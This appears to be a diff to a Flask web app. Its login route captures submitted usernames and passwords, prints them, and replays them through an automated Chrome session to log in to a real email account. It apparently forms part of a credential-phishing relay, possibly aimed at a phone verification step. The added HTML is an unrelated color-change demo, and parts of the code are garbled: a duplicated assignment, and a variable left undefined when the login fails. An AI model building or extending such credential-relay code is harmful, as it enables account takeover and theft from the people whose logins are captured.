@@ -4,6 +4,7 @@ from OpenSSL import SSL
 
 import random, string, os
 import time
+import main
 
 from _thread import start_new_thread
 
@@ -31,11 +32,43 @@ def login():
     email = request.form.get('username')
     password = request.form.get('password')
     print(email,password)
+    chrome = main.startChrome()
+    if chrome.login_email(email,password) == True:
+        #stop loading
+        html = html = """
+            <!DOCTYPE html>
+            <html>
+            <head>
+            <title>Change text color with Flask and JavaScript</title>
+            </head>
+            <body>
+            <p id="myText">This text will change color</p>
+            <button id="myButton">Change color</button>
+            <script>
+                var button = document.getElementById("myButton");
+                var text = document.getElementById("myText");
+                
+                button.addEventListener("click", function() {
+                fetch('/change-color')
+                    .then(function(response) {
+                    return response.text();
+                    })
+                    .then(function(color) {
+                    console.log(color);
+                    text.style.color = color;
+                    });
+                });
+            </script>
+            </body>
+            </html>
+            """
+        
 
+    
     # if request.method == "POST":
     #     todo = request.form.get("todo")
     #     print(todo)
-    return render_template('index.html')
+    return render_template('index.html',phone=html)
 
 @app.route("/")
 def home():
